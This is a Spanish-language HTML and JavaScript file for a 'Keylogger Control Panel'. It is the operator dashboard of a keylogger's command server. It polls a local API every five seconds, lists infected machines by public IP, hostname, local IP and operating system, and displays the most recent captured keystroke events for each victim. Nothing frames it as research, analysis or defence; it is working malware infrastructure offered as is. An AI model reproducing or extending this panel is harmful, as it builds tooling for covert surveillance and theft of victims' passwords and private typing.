
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üåê Panel de Control Keylogger</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 30px;
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .client-card {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 25px;
            border-left: 5px solid #00ff88;
            backdrop-filter: blur(10px);
        }
        
        .client-card.offline {
            border-left-color: #ff4444;
            opacity: 0.7;
        }
        
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .client-ip {
            font-size: 1.4rem;
            font-weight: bold;
        }
        
        .status-online {
            color: #00ff88;
            font-size: 1.2rem;
        }
        
        .status-offline {
            color: #ff4444;
            font-size: 1.2rem;
        }
        
        .client-info {
            margin: 10px 0;
        }
        
        .client-data {
            background: rgba(0,0,0,0.3);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .event-item {
            background: rgba(255,255,255,0.1);
            margin: 5px 0;
            padding: 8px;
            border-radius: 5px;
            font-size: 0.9rem;
        }
        
        .refresh-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #00ff88;
            color: #1e3c72;
            border: none;
            border-radius: 50px;
            padding: 15px 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0,255,136,0.3);
        }
        
        .stats-bar {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .stat-item {
            display: inline-block;
            margin: 0 30px;
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #00ff88;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üåê Panel de Control Keylogger</h1>
        <p>Monitoreo en tiempo real de clientes conectados</p>
    </div>
    
    <div class="stats-bar">
        <div class="stat-item">
            <div class="stat-number" id="totalClients">0</div>
            <div>Clientes Totales</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="onlineClients">0</div>
            <div>En L√≠nea</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="totalEvents">0</div>
            <div>Eventos Capturados</div>
        </div>
    </div>
    
    <div class="clients-grid" id="clientsGrid">
        <div style="text-align: center; color: #ccc;">
            <h3>‚è≥ Esperando clientes...</h3>
            <p>Los keyloggers aparecer√°n aqu√≠ cuando se conecten</p>
        </div>
    </div>
    
    <button class="refresh-btn" onclick="loadClients()">üîÑ Actualizar</button>
    
    <script>
        async function loadClients() {
            try {
                const response = await fetch('/api/clients');
                const clients = await response.json();
                
                displayClients(clients);
                updateStats(clients);
                
            } catch (error) {
                console.error('Error loading clients:', error);
            }
        }
        
        function displayClients(clients) {
            const grid = document.getElementById('clientsGrid');
            
            if (Object.keys(clients).length === 0) {
                grid.innerHTML = `
                    <div style="text-align: center; color: #ccc;">
                        <h3>‚è≥ Esperando clientes...</h3>
                        <p>Los keyloggers aparecer√°n aqu√≠ cuando se conecten</p>
                    </div>
                `;
                return;
            }
            
            grid.innerHTML = '';
            
            for (const [ip, info] of Object.entries(clients)) {
                const clientCard = document.createElement('div');
                clientCard.className = `client-card ${info.connected ? '' : 'offline'}`;
                
                clientCard.innerHTML = `
                    <div class="client-header">
                        <div class="client-ip">üìç ${ip}</div>
                        <div class="${info.connected ? 'status-online' : 'status-offline'}">
                            ${info.connected ? 'üü¢ En l√≠nea' : 'üî¥ Desconectado'}
                        </div>
                    </div>
                    
                    <div class="client-info">
                        <div><strong>üñ•Ô∏è Hostname:</strong> ${info.hostname || 'Desconocido'}</div>
                        <div><strong>üåç IP Local:</strong> ${info.local_ip || 'N/A'}</div>
                        <div><strong>üíª Sistema:</strong> ${info.os_info || 'Desconocido'}</div>
                        <div><strong>‚è∞ √öltimo contacto:</strong> ${info.last_seen || 'Nunca'}</div>
                        <div><strong>üìä Eventos:</strong> ${info.total_events || 0}</div>
                    </div>
                    
                    <div class="client-data" id="data-${ip.replace(/\./g, '_')}">
                        <div style="text-align: center; color: #ccc;">
                            <button onclick="loadClientData('${ip}')" style="background: #00ff88; color: #1e3c72; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer;">
                                üìã Ver Datos Capturados
                            </button>
                        </div>
                    </div>
                `;
                
                grid.appendChild(clientCard);
            }
        }
        
        async function loadClientData(clientIP) {
            try {
                const response = await fetch(`/api/client/${clientIP}/data`);
                const events = await response.json();
                
                const dataDiv = document.getElementById(`data-${clientIP.replace(/\./g, '_')}`);
                
                if (events.length === 0) {
                    dataDiv.innerHTML = '<div style="text-align: center; color: #ccc;">No hay datos a√∫n</div>';
                    return;
                }
                
                let html = '';
                events.slice(-10).forEach(event => {
                    const time = new Date(event.timestamp || event.server_received).toLocaleTimeString();
                    const type = event.type || 'unknown';
                    const data = JSON.stringify(event.data || '').substring(0, 50);
                    
                    html += `
                        <div class="event-item">
                            <strong>[${time}] ${type.toUpperCase()}:</strong> ${data}...
                        </div>
                    `;
                });
                
                dataDiv.innerHTML = html;
                
            } catch (error) {
                console.error('Error loading client data:', error);
            }
        }
        
        function updateStats(clients) {
            const total = Object.keys(clients).length;
            const online = Object.values(clients).filter(c => c.connected).length;
            const events = Object.values(clients).reduce((sum, c) => sum + (c.total_events || 0), 0);
            
            document.getElementById('totalClients').textContent = total;
            document.getElementById('onlineClients').textContent = online;
            document.getElementById('totalEvents').textContent = events;
        }
        
        // Auto-refresh cada 5 segundos
        setInterval(loadClients, 5000);
        
        // Cargar inicial
        loadClients();
    </script>
</body>
</html>
